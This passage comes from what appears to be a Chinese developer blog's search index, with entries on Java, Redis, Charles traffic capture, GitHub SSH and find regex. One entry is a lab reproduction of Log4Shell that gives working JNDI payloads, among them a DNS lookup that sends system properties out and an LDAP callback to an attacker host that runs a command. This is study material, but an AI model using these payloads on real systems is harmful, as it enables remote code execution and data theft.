class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;afterPropertiesSet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;InitSequenceBean: afterPropertiesSet&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;destroy&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;InitSequenceBean: destroy&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; } &lt;?xml version=1.0 encoding=UTF-8?&gt; &lt;beans xmlns=http://www.springframework.org/schema/beans  xmlns:mvc=http://www.springframework.org/schema/mvc  xmlns:xsi=http://www.w3.org/2001/XMLSchema-instance  xsi:schemaLocation=  http://www.springframework.org/schema/beans  http://www.springframework.org/schema/beans/spring-beans.xsd  http://www.springframework.org/schema/mvc  http://www.springframework.org/schema/mvc/spring-mvc.xsd&gt; &lt;span class=&quot;nt&quot;&gt;&amp;lt;bean&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;com.stone.studio.springdemo.lifecycle.InitSequenceBean&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;init-method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;initMethod&quot;&lt;/span&gt;  &lt;span class=&quot;na&quot;&gt;destroy-method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;destroyMethod&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt; &lt;/beans&gt; 参考 github 参考 ",
      "url"      : "http://localhost:4000/2020/10/16/spring-bean-lifecycle/"
    } ,
  
    {
      "title"    : "redis笔记",
      "category" : "redis",
      "content": "redis读书笔记 缓存和DB不一致 一般更新DB、更新缓存方案存在写写并发造成数据不一致的风险（并发时两个线程更新DB、更新缓存顺序不一致）。实际中一般是更新DB、删除缓存的方案。后者也可能存在下面问题。 更新DB成功，删除缓存失败造成数据不一致。可以通过重试解决 删除缓存成功、更新DB失败，一般短暂影响数据不一致。也可以通过重试解决 删除缓存成功，更新DB成功，多线程时存在数据不一致。需要延迟双删方案 更新DB成功，删除缓存成功。等待缓存删除短暂期间有数据不一致风险 缓存雪崩 大多数缓存key同时过期，造成查询全部到DB层。需要优化过期时间的设置，比如加入随机值 缓存击穿 热点key过期时，查询压力全部到内存。解法方法是热点key不过期，更新DB时更新redis（写DB写缓存并发有数据不一致风险） 缓存穿透 这个场景主要是考虑DB中key也不存在时。一般是外部攻击或者程序设计不当。可以考虑加入默认null key或者布隆过滤器解决 ",
      "url"      : "http://localhost:4000/2020/10/19/redis/"
    } ,
  
    {
      "title"    : "java类什么时候初始化",
      "category" : "JVM",
      "content": "这里的初始化指的是JVM启动时经过加载-链接（验证、准备、解析）后的初始化阶段 具体哪些操作会触发类的初始化呢 当虚拟机启动时，初始化用户指定的主类； 当遇到用以新建目标类实例的 new 指令时，初始化 new 指令的目标类； 当遇到调用静态方法的指令时，初始化该静态方法所在的类； 当遇到访问静态字段的指令时，初始化该静态字段所在的类； 子类的初始化会触发父类的初始化； 如果一个接口定义了 default 方法，那么直接实现或者间接实现该接口的类的初始化，会触发该接口的初始化； 使用反射 API 对某个类进行反射调用时，初始化这个类； 当初次调用 MethodHandle 实例时，初始化该 MethodHandle 指向的方法所在的类 下面单例类的实现就是利用了上面的第四个规则 当遇到访问静态字段的指令时，初始化该静态字段所在的类 public class Singleton { private Singleton() {} private static class LazyHolder {  static final Singleton INSTANCE = new Singleton(); } public static Singleton getInstance() {  return LazyHolder.INSTANCE; } } ",
      "url"      : "http://localhost:4000/2020/10/22/class-init/"
    } ,
  
    {
      "title"    : "java中生成的bridge和syntheic代码",
      "category" : "java bytecode synthetic",
      "content": "Java中有些方法从字节码来看flags中包含ACC_BRIDGE, ACC_SYNTHETIC，一般是编译为class文件时生成的。这里看看java中有哪些场景会生成 如何查看字节码 Class名包括/不包括.class扩展名都可以 javap -v -c package.Class名 继承override 父类 public class Merchant {  public Number actionPrice(double price) {  return price * 0.8;  } } 子类 public class NaiveMerchant extends Merchant {  @Override  public Double actionPrice(double price) {  return 0.9 * price;  } } 注意子类覆盖父类的时候，返回值类型不同(父类是Number，子类是Double)。JVM虚拟机字节码层面跟JDK语言层面不一样，方法描述符包括返回类型，如果类型不相同，虚拟机怎么决定这是一个有效的继承覆盖呢？查看字节码会发现字节码中多了一个bridge桥接方法（flags: ACC_PUBLIC, ACC_BRIDGE, ACC_SYNTHETIC）,桥接方法会内部调用返回类型不同的真正方法。 javap -v -c production.classes.com.stone.bytecode.NaiveMerchant public java.lang.Double actionPrice(double);  descriptor: (D)Ljava/lang/Double;  flags: ACC_PUBLIC  Code:  stack=4, locals=3, args_size=2  0: ldc2_w  #2   // double 0.9d  3: dload_1  4: dmul  5: invokestatic #4   // Method java/lang/Double.valueOf:(D)Ljava/lang/Double;  8: areturn  LineNumberTable:  line 12: 0  LocalVariableTable:  Start Length Slot Name Signature   0  9  0 this Lcom/stone/bytecode/NaiveMerchant;   0  9  1 price D public java.lang.Number actionPrice(double); descriptor: (D)Ljava/lang/Number; flags: ACC_PUBLIC, ACC_BRIDGE, ACC_SYNTHETIC Code: stack=3, locals=3, args_size=2 0: aload_0 1: dload_1 2: invokevirtual #12    // Method actionPrice:(D)Ljava/lang/Double; 5: areturn LineNumberTable: line 9: 0 LocalVariableTable: Start Length Slot Name Signature 0  6  0 this Lcom/stone/bytecode/NaiveMerchant; } SourceFile: &quot;NaiveMerchant.java&quot; 泛型类、泛型方法中的继承 public interface Customer { &lt;span class=&quot;kt&quot;&gt;double&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;rate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt; } public class VipCustomer implements Customer {  @Override  public double rate() {  return 0.8;  } } abstract public class Shop&lt;T extends Customer&gt; {  abstract double purchase(double price, T customer); } public class VipShop extends Shop { @Override double purchase(double price, VipCustomer customer) { return price * customer.rate(); } } javap -v -c production.classes.com.stone.bytecode.VipShop 生成了下面的桥接方法, 注意因为泛型类型擦除，T extends Customer泛型类中的声明直接用com.stone.bytecode.Customer来代替了。 double purchase(double, com.stone.bytecode.Customer);  descriptor: (DLcom/stone/bytecode/Customer;)D  flags: ACC_BRIDGE, ACC_SYNTHETIC  ...  6: invokevirtual #4   // Method purchase:(DLcom/stone/bytecode/VipCustomer;)D  ... 可以看到桥接方法内部调用子类真正的purchase方法 ",
      "url"      : "http://localhost:4000/2020/10/24/java-synthetic-bytecode/"
    } ,
  
    {
      "title"    : "java对象内存对齐",
      "category" : "java object layout",
      "content": "如何通过JOL查看Java对象内存结构 curl -L -O curl -L -O https://repo.maven.apache.org/maven2/org/openjdk/jol/jol-cli/0.9/jol-cli-0.9-full.jar java -cp jol-cli-0.9-full.jar org.openjdk.jol.Main internals java.lang.String java -cp jol-cli-0.9-full.jar org.openjdk.jol.Main internals java.lang.Integer ",
      "url"      : "http://localhost:4000/2020/12/13/java-object-layout/"
    } ,
  
    {
      "title"    : "Java Bytecode",
      "category" : "",
      "content": "",
      "url"      : "http://localhost:4000/2020/12/14/java-bytecode/"
    } ,
  
    {
      "title"    : "java doulbe long读写是否原子性",
      "category" : "java double long",
      "content": "java double long占用8个字节，读写double 或者 long字段是否保持原子性呢 参考Java语言规范，对double和long的读写拆分为2次4字节的操作，不能保证原子性。但是声明为volatile后，jvm虚拟机一般会保证不拆分，保证原子性。具体参考下面Oracle官方文档。 17.7. Non-Atomic Treatment of double and long For the purposes of the Java programming language memory model, a single write to a non-volatile long or double value is treated as two separate writes: one to each 32-bit half. This can result in a situation where a thread sees the first 32 bits of a 64-bit value from one write, and the second 32 bits from another write. Writes and reads of volatile long and double values are always atomic. Writes to and reads of references are always atomic, regardless of whether they are implemented as 32-bit or 64-bit values. Some implementations may find it convenient to divide a single write action on a 64-bit long or double value into two write actions on adjacent 32-bit values. For efficiency's sake, this behavior is implementation-specific; an implementation of the Java Virtual Machine is free to perform writes to long and double values atomically or in two parts. Implementations of the Java Virtual Machine are encouraged to avoid splitting 64-bit values where possible. Programmers are encouraged to declare shared 64-bit values as volatile or synchronize their programs correctly to avoid possible complications. 参考 读写是否原子性 ",
      "url"      : "http://localhost:4000/2020/12/24/java-double-long/"
    } ,
  
    {
      "title"    : "android app抓包",
      "category" : "android charles",
      "content": "抓包步骤 mac电脑安装charles 1 下载v 4.6版本并安装 2 关闭电脑上其他VPN客户端，否则抓包失败 3 支持https 3.1 Help -&gt; SSL Proxying -&gt; Install Charles Root Certificate，选择“Always Trust” 3.2 Proxy -&gt; SSL Proxy Settings SSL Proxying选项卡中location中配置域名和端口，否则抓包内容显示为unknown 3.3 客户端android设置代理和端口 代理IP和端口可以通过charles菜单知道 charles-&gt;help-&gt;SSL Proxying-&gt;Install Charles Root Certificate on a Mobile Device or Remote Browser 3.3 客户端android安装证书 andorid浏览器访问http://chls.pro/ssl下载crt证书文件，并点击安装 注意高版本的android虽然提升安装证书成功，但是实际上失败，抓包内容还是显示unknown。比如小米9 Android 10上面https抓包失败；另外vivo android 6上面抓包正常。 ",
      "url"      : "http://localhost:4000/2021/03/13/app-charles/"
    } ,
  
    {
      "title"    : "2021年终总结",
      "category" : "blog",
      "content": "2021年终总结 爱过、恨过？想多了。2.1线，每天一副披星赶月的模样，年终咋发现还是没有改变？要不再给2022年立个flag，娱乐一下自己？ 增加安全行业知识的积累，用行业、甲方、乙方、企业的眼光看技术栈、系统和产品 公众号、博客不能荒废了，要有自己的思考和输出 多读优秀的开源产品代码。咋越看越觉得自己才入门？ 中间件最新动态需要了解比如微服务、云原生、service mesh下中间件的发展 算法和数据结构 go go go 我的2021 红蓝资源对抗 rasp 算法和数据结构 做的不好的地方： docker/k8s上没啥投入和进步 微服务和中间件上没有投入和跟进 安全业务和技术提留在表面。fastjson/log4j2漏洞都是好的学习案例 微博和公众号基本没有更新 ",
      "url"      : "http://localhost:4000/2022/01/03/annual-summary/"
    } ,
  
    {
      "title"    : "2022年终总结",
      "category" : "blog",
      "content": "2022年终总结（从公众号搬过来的） 2022年过去了，2023农历新年也快结束了。又是回顾过去、展望未来的时候了。 2022年立的flag有：系统化学习信息安全知识和动手能力；多参与开源软件和社区工作，增加影响力。很惭愧，自评不及格。个人执行力不够。 技术方向上，Java Agent深度上还是比较有欠缺；广度上网络信息安全、中间件、大数据、全栈、DDD、区块链web 3.0 NFT等都是比较有意思的方向。人到中年，技术广度比深度更重要。 投资理财上，继续是交学费的阶段。2022年少亏就是赢。投资目标不是当前，希望失业后这部分能带来部分被动收入。投资策略上也比较迷茫，指数、定投都试过，2年下来还是亏麻了。俄乌战争结束前不想直接投资股票，债券和定期为主，投顾为辅，注意风险分散。 生活方面，虽然经历了上海COVID-19保卫战（上半年抢菜、下半年抢药）和杨过的经历，幸好家人以及远在外地的父母都挺过来了。2022年坚持了很长一段时间的晨跑和篮球，直到年底的放开躺平。自12/27第一次感染，今天刚好一个月，目前还不敢怎么运动，比较怕死。目前身体感觉还好，后面会增加锻炼的强度。身体是革命的本钱，这上面的投资，值！ 2023年预期会有更多的不确定性。主要问自己的是下一个十年我能干什么？理想的情况是工作和兴趣相结合还能养家糊口。滴滴和送外卖也考虑过，中年大叔跟小年轻拼体力不靠谱。还是需要看程序员工作相关的可能性。 网络安全其实蛮考验个人的计算机综合实力，对知识面广度要求更高。比如漏洞利用demo、web安全和应用安全漏洞POC，没有一定的知识储备，理解漏洞都是问题。这方面真的挺佩服圈内大佬，不关注学历和文凭，但是往往在漏洞发现、攻防对抗实践等方面是大多数安全从业者不可企及的。兴趣是最好的老师和动力，2023年我需要和自己谈谈，自己有没有这个兴趣？ 2023年注定是不平淡的一年，有预期但是不能躺平。作为个人，唯有保持一颗平常心做好自己的本职工作，并思考自己核心竞争力在哪、自己的兴趣在哪？ ",
      "url"      : "http://localhost:4000/2023/01/27/annual-summary/"
    } ,
  
    {
      "title"    : "log4j2漏洞学习",
      "category" : "漏洞分析",
      "content": "Log4Shell漏洞分析和复现 一、漏洞回顾 Log4Shell 漏洞最早是阿里巴巴安全研究员 Chen Zhaojun 早在 2021 年 12 月 10 日发布（早在 11 月 24 日已发现上报），漏洞编号CVE-2021-44228。影响 log4j2 2.0-beta9 到 2.15.0 多个版本，攻击者利用 log4j2 写日志时注入 jndi lookup 链接并执行远程命令。鉴于 log4j2 在 Java 生态圈的广泛使用，该漏洞一发现就妥妥到零日漏洞，CVSS（Common Vulnerability Scoring System）评级系统中最严重的 10. 不少同行一定对当初加班紧急修复该漏洞记忆犹新。修复过程中也一波三折，衍生了 CVE-2021-45046，CVE-2021-45105，CVE-2021-44832 等漏洞，最终在 log4j2 2.17.1 版本修复。 二、漏洞复现 本文主要基于最初的漏洞在 log4j2 2.14.1 版本进行复现。主要内容包括： 通过 docker 容器复现漏洞应用 通过 jndi dnslog 模拟带外攻击执行系统属性查询 通过 jndi lookup 远程命令执行 2.1 复现漏洞应用 复现漏洞依赖 JDK 版本和 log4j2 版本，一般通过容器镜像来比较方便。从网上找了一个应用 fork 出来漏洞应用。 JDK：8u102 log4j2: 2.14.1 运行应用有两种方式: 方式 1 cd CVE-2021-44228-VULN-APP/ docker build -t log4j-shell-poc . docker run -p 8082:8080 log4j-shell-poc 方式 2（需要本地安装 Docker Desktop） docker pull nu11secur1ty/log4j-vuln-application docker run -p 8082:8080 nu11secur1ty/log4j-vuln-application 外部通过http://localhost:8082/来访问。显示如下： 2.2 dnslog 攻击 利用 dnslog 可以进行一种 OOB(Out Of Band)攻击。这里所谓的带外指的是不同与原本的业务请求响应数据路径，比如这里的 DNS 请求路径。 OOB 攻击依赖 DNS 泛域名解析。简单来说泛域名解析指的是*.t831at.dnslog.cn 都会解析到域名 t831at.dnslog.cn 上。通过查看 t831at.dnslog.cn 的域名解析日志就可以看到 dns 查询命令执行的结果。 具体步骤如下： 登陆http://www.dnslog.cn/ 点击“Get SubDomain&quot;比如得到域名“t831at.dnslog.cn” 在 2.1 部分部署的漏洞应用页面输入 Username: ${jndi:dns://${sys:java.version}.t831at.dnslog.cn} Password: password 在http://www.dnslog.cn/页面点击“Refresh Record&quot;。可以看到 1.8.0_102.t831at.dnslog.cn 中最前面的1.8.0_102就是漏洞应用的 JDK 版本。 sys:java.version中java.version可以替换为操作系统名和版本，用户名和目录等系统环境信息。具体可以参考系统属性 jndi 命令执行 这里需要用到一个工具应用JNDI-Injection-Exploit，这个应用会生成 jndi 远程服务，提供命令给漏洞应用来下载并在漏洞应用中执行。 比如我们需要在漏洞应用中写入一个文件/tmp/success.txt。操作步骤如下： 从 github 下载代码并构建启动服务 git clone git@github.com:shidongwa/JNDI-Injection-Exploit.git cd JNDI-Injection-Exploit.git mvn clean package cd target # 假设192.168.10.104是攻击者服务器ip java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;touch /tmp/success.txt&quot; -A &quot;192.168.10.104&quot; 我们是 java 8，从上面服务的启动日志中获取 jndi 服务地址ldap://192.168.10.104:1389/5jqrji。攻击 payload 是${jndi:ldap://192.168.10.104:1389/5jqrji} 在 2.1 部分部署的漏洞应用页面输入 Username: ${jndi:ldap://192.168.10.104:1389/5jqrji} Password: password 在漏洞主机中验证/tmp/success.txt 确实已写入 docker container ls docker exec -it 95fc bash ls -al /tmp/success.txt 三、总结 通过对 log4j2 漏洞进行了回顾和复现，学习了 log4j2 jndi lookup 功能调用 ldap、dns 执行远程命令。对反弹 shell 和 rmi 等本文未涉及。 ",
      "url"      : "http://localhost:4000/2023/09/17/log4shell/"
    } ,
  
    {
      "title"    : "切换github账号中遇到的坑",
      "category" : "github",
      "content": "背景 工作需要，在mac命令行中切换github账号，始终未成功。push代码的时候提示“ERROR: Permission to xxx/xxx.github.io.git denied&quot; ➜ xxx.github.io git:(main) git push -u origin main ERROR: Permission to [account2]/xxx.github.io.git denied to [account1]. fatal: Could not read from remote repository. Please make sure you have the correct access rights and the repository exists. 原因 通过ssh -T git@github.com发现用github account1账号访问了github account2的代码仓库； 通过git config --list 检查user.name是account2，符合预期； 怀疑mac keychain中缓存问题，清理后无效； 按照Error: Permission denied (publickey)检查不符合预期。ssh-add -l -E sha256 结果为空；怀疑是这个问题； 按照Generating a new SSH key and adding it to the ssh-agent，关键的一步是ssh-add ~/.ssh/id_ed25519 Note: The --apple-use-keychain option stores the passphrase in your keychain for you when you add an SSH key to the ssh-agent. If you chose not to add a passphrase to your key, run the command without the --apple-use-keychain option. 完整解决方案如下(第 2 步确认输出为空，第 3 步的 id_ed25519确认为需要提交的 github 账号对应的密钥) eval &quot;$(ssh-agent -s)&quot; ssh-add -l -E sha256 ssh-add ~/.ssh/id_ed25519 ",
      "url"      : "http://localhost:4000/2023/10/05/swith-account-copy/"
    } ,
  
    {
      "title"    : "2023 年终总结（补）",
      "category" : "年终总结",
      "content": "ChatGPT ChatGPT 元年，技术圈、创业圈、投资圈都是 ChatGPT。从个人到公司都想沾点热度，公众号、个人 IP、短视频带上 ChatGPT就有流量啦；公司有 ChatGPT 业务范围估值就上去了；据说毕业论文中集成 ChatGPT API 就能得 A 了。 ChatGPT 我个人感受是一个比搜索引擎更方便的工具。现阶段作为通用人工智能还早，但是如果结合特定领域，作为 Agen 或者 GPTs 存在还是比较看好。那个懂我的个人助理说不定哪天就到了我们身边。5 年前我们一直说的自动驾驶技术、5G 技术、Web3没有及时兑现，这次 AI 浪潮 会有不同么？ 现阶段 ChatGPT 解决不了工作流中人的因素，实际日常工作中遇到的问题人都理不清楚，你认为 ChatGPT 能帮你解决了给你一个答案，你敢信么？ 预期中的 Covid-19后的美国经济衰退没有出现，ChatGPT 倒是搞得风生水起。不得不说美国人真会玩。国内的科技创新任重道远，产业升级已如箭在玄上，不得不发。这么多中青年失业摆在那人，总的有个出路。房地产、金融、互联网都玩坏了，大家都送外卖去？ GPT Store 是一个 NB的想法，开发者社区和业务场景有了，说不定又是一波流的 APP 产品开发，大家一起发财。对于用户来说，使用 GPT应用来辅助设计、编码、写文案、生成图片视频，谁先掌握工具个人提效，谁就是那个不被代替的人。 投资理财 一年下来装死，本着我不卖就不算亏损，随着大盘 3000 点上上下下，账号浮亏大概和去年量级一致。尼玛，基金股票我都没操作都能这样？ 股市基金过去没有凭运气赚钱，现在是凭实力亏钱，这个领域真是超出自己的认知（其实身边还是有同事赚钱的，期货方面）。2024，相信 D 相信国家，继续死磕。 勇士队 勇士这 2 年看不大懂，同样的冠军阵容核心人员，为啥这 2 年比赛就缺少了精气神。成绩不咋的，更衣室矛盾是亮点。新老交替这么难？或者自己太敏感？ 无论如何，Stephen Curry还是自己比较喜欢的球员，要不为啥自己这么喜欢在三分线外浪投，跟老大爷似的？ 关于工作 作为一个大龄程序员没啥好说的。能有一个公司一个老板能接受你就不错了。 作为个人一直在思考自己的竞争力是什么？经验？学历？工作背景？这些在今天大环境下都被年龄 KO。 IT行业是服务业，IT 从业人员的核心竞争力在于能解决问题。在公司能帮部门、团队解决 KPI 关注点（原谅我不能直接从最终用户角度来看），提供问题的解决思路和方案，落地推广，项目和产品按期交付；作为个人开发者，挑战更大，需要了解最终用户的需求、痛点，能够触达他们并且变现。找工作前我们一般会准备几周或者几个月，刷 Leetcode 算法和面试题，面试官和面试者 PK 一番对上眼了，好，就是你。面试通过进入了心仪的大厂，拿着相比其他行业高的月薪，你就很厉害了么？不一定，离开平台，比起身边送外卖或者开出租车的你能给别人提供什么更大的价值？ 技术深度感觉需要天赋和机会，持续在一个细分领域多年，取得业界领先。大部分人只能在广度上发展，这个需要对业务敏感，结合不同技术栈解决实际的业务痛点。也就是，我有这么一个问题，你能帮我解决么？ 个人开发方面笔记、TODO、记账领域已经卷成红海。需求、创新一直在，如何触达？自己任然在路上。 未来很长，个人关注还是自己想想能提供什么能力，怎么变现？没有后路，那就尝试摸索另外一条路。别问我路在哪里，我不知道，也许 2025 年您再来看看就知道了。也许是一个笑话，大家开心就好。 关于个人 个人 IP 以前不怎么重视，也许是懒的原因，个人缺少总结和提升，如同乱糟糟的家居环境或者工作环境一样。 特别佩服 github 上几千上万 star 的大牛们，主流内容平台的大 V 们，其中背后的付出只有自己才知道。自己写一篇文章来来回回折腾好久是有体会的。向你们学习，做一个思考有深度的老年人。 一个感想是：拷贝粘贴在内容创作上是不被买账的，只有真正有深度的思考和原创，获取其他人的共鸣的才有流量和曝光。 ",
      "url"      : "http://localhost:4000/2023/12/30/2023-summary/"
    } ,
  
    {
      "title"    : "程序员的工具库",
      "category" : "it-tools",
      "content": "如何部署自己的 IT 工具库 日常开发中经常需要用到下面功能： json 格式化或者验证 unixtime 时间转换 url encoding 和 decoding md5 加解密 ...... 一般可以通过操作系统shell，脚本语言，在线工具来解决。据说一些有商业头脑的通过运营类似网站日活可观，广告收入惊人。 其实我们可以自己搭建一个在线工具站，通过 github pages 部署，完全免费。效果如下： 搭建方法： 从 github fork 项目https://github.com/shidongwa/it-tools（git clone git@github.com:shidongwa/it-tools.git) 启用和运行 github Actions “Deploy to Github Pages”（deploy-github-pages.yml） github pages 设置中“Build and deployment” Source 中设置为“GitHub Actions” 访问你项目网站 https://[用户名].github.io/it-tools/。[用户名]替换为您的github账号名，比如我部署后网站名是：https://seesea2024.github.io/it-tools/ ",
      "url"      : "http://localhost:4000/2024/05/19/it-tools/"
    } ,
  
    {
      "title"    : "豆包AI编程实践：RSS Web客户端实现",
      "category" : "ai",
      "content": "一、项目需求 本文旨在通过豆包AI编程功能，实践开发一个RSS Web客户端。 项目需求如下： 界面简洁美观 内容精炼：每个RSS源仅显示最近3条记录，以避免信息过载。 友好展示：RSS记录的页面展示应同时对图文和中英文内容友好。 数据存储：为避免频繁访问源页面，程序需定时从RSS源抓取数据并存储到本地数据库。 豆包AI编程入口如下。 二、豆包AI编程实践 豆包AI编程prompt记录 2.1 纯前端实现 在纯前端实现方案中，RSS源和抓取的网页数据被存储在浏览器的 LocalStorage 中。这种方式无法实现跨浏览器、跨用户或跨机器同步，仅适用于演示（demo）目的。该方案支持在豆包平台进行调试，并能生成完整的安装包文件供本地运行和调试。 下载到本地的好处在于，用户可以自行进行分发和部署，同时解决了某些网站需要科学上网才能访问的问题。 将生成的 html 文件下载到本地后，在同一目录下运行以下命令即可启动一个HTTP服务器： python3 -m http.server 8000 AI生成和调试过程中，遇到了以下问题： 表单提交限制问题： 第一个版本的代码中，form 表单提交存在限制。在遇到问题后，豆包的解决方案是将表单按钮类型从 submit 改为 button，并通过 JavaScript 手动提交表单，从而避免了以下错误： Blocked form submission to '' because the form's frame is sandboxed and the 'allow-forms' permission is not set. 跨域问题： 由于前端代码需要访问不同的RSS源，会产生跨域问题。豆包平台的解决方案是使用第三方代理服务，例如 https://cors-anywhere.herokuapp.com/，由代理服务器请求RSS源，并在返回给浏览器时声明允许跨域。不过这个访问是临时性的，需要测试时提前申请一个临时时间段，如下。  网络访问限制： 部分RSS源只能通过科学上网才能访问，这超出了豆包平台的处理范畴，需要用户自行解决。 2.2 前后端实现 豆包AI编程支持生成完整的全栈应用方案和代码，包括 Node.js 后端API和 MongoDB 数据库代码。但该方案不支持直接生成安装包下载，也不支持在平台进行调试。 Prompt提问过程中豆包回答如下： 由于平台限制，无法直接提供可下载的压缩包文件，但我可以提供一个一键生成完整项目文件的脚本，您只需复制执行即可在本地生成所有代码文件 虽然通过 shell 脚本生成所有的代码目录和文件这种方式显得有些原始，但在我的MacBook上测试后，它确实能正常运行。 生成的项目目录结构如下： 启动服务端 # shell生成项目目录和文件,假设shell文件名为genPrj.sh chmod +x genPrj.sh ./genPrj.sh # 进入后端目录 cd rss-client/server # 安装依赖 npm install # 启动MongoDB brew update # 安装mongoDB brew仓库 brew tap mongodb/brew # 安装community最新版本 brew install mongodb-community # 启动mongoDB服务 brew services start mongodb-community # 启动后端服务（确保MongoDB已运行） npm start 启动客户端 cd rss-client/client # 启动前端应用服务 python3 -m http.server 8001 在浏览器中访问 http://localhost:8001，验收成功！ 三、总结 豆包AI编程的优势在于其前端项目的页面和代码生成能力、平台上的部署与调试功能，以及支持将安装包下载到本地进行部署和调试。生成的页面整体视觉效果也很不错。然而，纯前端的解决方案局限性较大，无法满足所有需求。 虽然它能生成可用的后端代码，但目前不支持在平台上进行部署和调试，也不支持直接生成本地代码安装包。 从长远来看，如果豆包能实现前后端一体化的代码生成、部署、调试，并支持本地安装包下载，甚至能对接像 Vercel 或 Cloudflare 这样的PaaS平台进行自动化部署，那么它的生态将更加完善，也必将吸引大量开发者。 github代码 ",
      "url"      : "http://localhost:4000/2025/08/10/doubao-ai/"
    } ,
  
    {
      "title"    : "Centos 7 通过正则表达式查找文件的坑",
      "category" : "linux",
      "content": "一、问题 工作中需要在指定目录下按照正则表达式查找文件（存在多级目录结构），然后进行备份或者清理。 比如说Centos7中文件目录结构如下： 当前目录：/home/devops/mysqlbackup 查找文件：/home/devops/mysqlbackup/20250729/backup_20250729_021002.tgz，路径和文件名中的20250729和021002可以是任意数字 预期结果如下： /home/devops/mysqlbackup/20250722/backup_20250722_102952.tgz /home/devops/mysqlbackup/20250729/backup_20250729_021002.tgz /home/devops/mysqlbackup/20250730/backup_20250730_021001.tgz 二、方案 万事不决先问AI。提示词如下 centos系统中/home/devops/mysqlbackup目录下搜索类似20250729/backup_20250729_021002.tgz格式的文件。20250729和021002是任意数字，其他作为正则模式进行匹配。请提供对应的Linux命令搜索所有符合条件的文件并打印全路径。 ChatGPT和Gemini给出的答复分别如下： ChatGPT 方案 - 结果不符合预期 find /home/devops/mysqlbackup -type f -regextype posix-extended -regex '.*/[0-9]{8}/backup_[0-9]{8}_[0-9]{6}  .tgz' Gemini 方案 - 结果符合预期 # 方法一使用find + grep find /home/devops/mysqlbackup/ -type f | grep -E &quot;/[0-9]{8}/backup_[0-9]{8}_[0-9]{6}  .tgz$&quot; 方法二使用find find /home/devops/mysqlbackup/ -type f -path &quot;*/[0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9]/backup_[0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9]_[0-9][0-9][0-9][0-9][0-9][0-9].tgz&quot; 系统版本如下： cat /etc/redhat-release CentOS Linux release 7.8.2003 (Core) 2.1 问题分析 复盘AI Prompt对话过程中遇到的几个问题。 AI首先会建议采用find+regex的方式。regex必须采用全路径正则匹配（第一个坑）。 # 方式一 find /home/devops/mysqlbackup -type f -regex &quot;/home/devops/mysqlbackup/  d{8}/backup_  d{8}_  d{6}  .tgz&quot; 方式二 cd /home/devops/mysqlbackup find ./ -type f -regex &quot;./[0-9]/backup_[0-9]_[0-9].tgz$&quot; find 的起始路径不同，正则表达式也会不一样。如果不确定的话先执行一下find看一下搜索结果。比如下面： cd /home/devops/mysqlbackup/ [root@xxx mysqlbackup]# find ./ -type f ./20250729/backup_20250729_021002.tgz find /home/devops/mysqlbackup/ -type f /home/devops/mysqlbackup/20250816/backup_20250816_021001.tgz 然而上面两种方式都不能搜索到预期的问题。第二个坑：regex不支持  d{m}这种正则匹配方式。关于GNU正则有BRE（Basic Regular Expressions）和ERE（Extended Regular Expressions）之分，find命令默认支持的是BRE. The find command in CentOS (and most Linux distributions) by default uses POSIX Basic Regular Expressions (BRE) or Extended Regular Expressions (ERE) depending on the -regextype option. The   d metacharacter and {m} repetition quantifier are features of Perl Compatible Regular Expressions (PCRE), which are not natively supported by find's default regex engines. 解决方法是参数增加-regextype posix-extended 或者-regextype posix-egrep 支持ERE扩展正则。不过开启ERE后{m}可以了,  d仍然不支持，需要修改为[0-9]这种方式来代替。 # 正则准确匹配起始路径 find /home/devops/mysqlbackup -type f -regextype posix-egrep -regex &quot;/home/devops/mysqlbackup/[0-9]{8}/backup_[0-9]{8}_[0-9] {6}  .tgz&quot; 正则通配符匹配起始路径 find /home/devops/mysqlbackup -type f -regextype posix-egrep -regex &quot;.*/[0-9]{8}/backup_[0-9]{8}_[0-9]{6}.tgz&quot; 不幸的是还是匹配不到预期的文件。这里需要提到的是第三个坑：/home/devops/mysqlbackup是一个软链，链接到数据盘另外的目录，find命令中查找条件是-type 